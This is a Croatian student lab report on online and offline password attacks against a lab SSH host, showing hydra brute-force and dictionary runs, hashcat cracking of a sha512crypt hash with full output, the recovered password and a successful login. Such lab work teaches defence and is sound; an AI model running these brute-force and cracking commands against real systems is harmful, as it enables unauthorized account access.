# 5.Laboratorijska vježba(Online and Offline Password Guessing Attacks])

Cilj vježbe bio je napad nadocker zaštićen lozinkom.Napadali smo sutav online i offline.

Online napad se izvodio preko Usernamea i IP adrese koristeći podatke iz korištenog "riječnika-a”.

Offline metodom probijamo autentikaciju fokusirajući se na spremljene hash vrijednosti lozinki.

Za online napad bio nam je potreban nmap alat.

**ONLINE NAPAD**

```bash
sudo apt-get update
sudo apt-get install nmap

# Test it
nmap
```

![Untitled](5%20Laboratorijska%20vjez%CC%8Cba(Online%20and%20Offline%20Passwo%203b34154d74ab4583b353a0c18ac81b90/Untitled.png)

Sada pomoću Hydra alata pokusavamo pogoditi šifru koja je predefinirana u riječniku.

```bash
# hydra -l milic_jakov -x 4:6:a 10.0.15.1 -V -t 1 ssh
```

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/jmilic00$ hydra -l milic_jakov -x 4:6:a 10.0.15.1 -V -t 1 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-20 13:15:36
[DATA] max 1 task per 1 server, overall 1 task, 321254128 login tries (l:1/p:321254128), ~321254128 tries per task
[DATA] attacking ssh://10.0.15.6:22/
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "aaaa" - 1 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "aaab" - 2 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "aaac" - 3 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "aaad" - 4 of 321254128 [child 0] (0/0)
.
.
.

```

Budući da ovaj način je ima toliko permutacija da je jednostavno nemoguće naći(trajanje pronalađenja permutacija je jednak broju 26*26*26*26*[iteracija/sekundi]),koristimo već gotovi riječnik pomoću kojeg pronađemo puno lakše i brže pronaći lozinku.

```bash
hydra -l milic_jakov -P dictionary/g1/dictionary_online.txt 10.0.15.1 -V -t 4 ssh

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-20 13:43:21
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 878 login tries (l:1/p:878), ~220 tries per task
[DATA] attacking ssh://10.0.15.6:22/
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajjeg" - 1 of 878 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajttg" - 2 of 878 [child 1] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajtze" - 3 of 878 [child 2] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajnek" - 4 of 878 [child 3] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajlzj" - 5 of 878 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "milic_jakov" - pass "kajnpp" - 6 of 878 [child 1] (0/0)
.......

[22][ssh] host: 10.0.15.1   login: milic_jakov   password: kptrst
```

nakon otprilike 10-tak  minuta lozinka je bila pronađena.

![Untitled](5%20Laboratorijska%20vjez%CC%8Cba(Online%20and%20Offline%20Passwo%203b34154d74ab4583b353a0c18ac81b90/Untitled%201.png)

**OFFLINE NAPAD**

Sada se fokusiramo na spremljene hasheve na uređaju koje uspoređujemo pomoću hascat alata.

```bash
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

![Untitled](5%20Laboratorijska%20vjez%CC%8Cba(Online%20and%20Offline%20Passwo%203b34154d74ab4583b353a0c18ac81b90/Untitled%202.png)

Prosječno vrijeme pronalaženja lozinke je 50%, što je i vidljivo iz slučaja na donjem codu.

```bash
tudent@DESKTOP-7Q0BASR:/mnt/c/Users/A507/jmilic00$ hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 2048/7411 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
* Device #1: Kernel amp_a0.bcd87d4b.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: dictionary/g1/dictionary_offline.txt
* Passwords.: 50078
* Bytes.....: 350546
* Keyspace..: 50078
* Runtime...: 0 secs

- Device #1: autotuned kernel-accel to 44
- Device #1: autotuned kernel-loops to 46
$6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stCkdaELqDuF5aa86cLQ0oNnOVGBTKkmEn/0benNRsrPJIBYv1XNqu29./:dscext=>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stC...qu29./
Time.Started.....: Mon Dec 20 14:18:29 2021 (1 min, 33 secs)
Time.Estimated...: Mon Dec 20 14:20:02 2021 (0 secs)
Guess.Base.......: File (dictionary/g1/dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      219 H/s (6.52ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 22567/50078 (45.06%)
Rejected.........: 0/22567 (0.00%)
Restore.Point....: 22439/50078 (44.8%)
Candidates.#1....: ztpnjb -> zhbaln
HWMon.Dev.#1.....: N/A

Started: Mon Dec 20 14:18:27 2021
Stopped: Mon Dec 20 14:20:03 2021
```

sada SSH prolazi autentikaciju te napadač može pristupiti sustavu.

Pristupili smo bazi nakon sto smo prosli kroz 45.06%. pokušaja. 

```bash
ssh milic_jakov@10.0.15.1
```

nakon unošenja passworda kojeg smo maloprije pronašli dobijemo pristup sustavu.

![Untitled](5%20Laboratorijska%20vjez%CC%8Cba(Online%20and%20Offline%20Passwo%203b34154d74ab4583b353a0c18ac81b90/Untitled%203.png)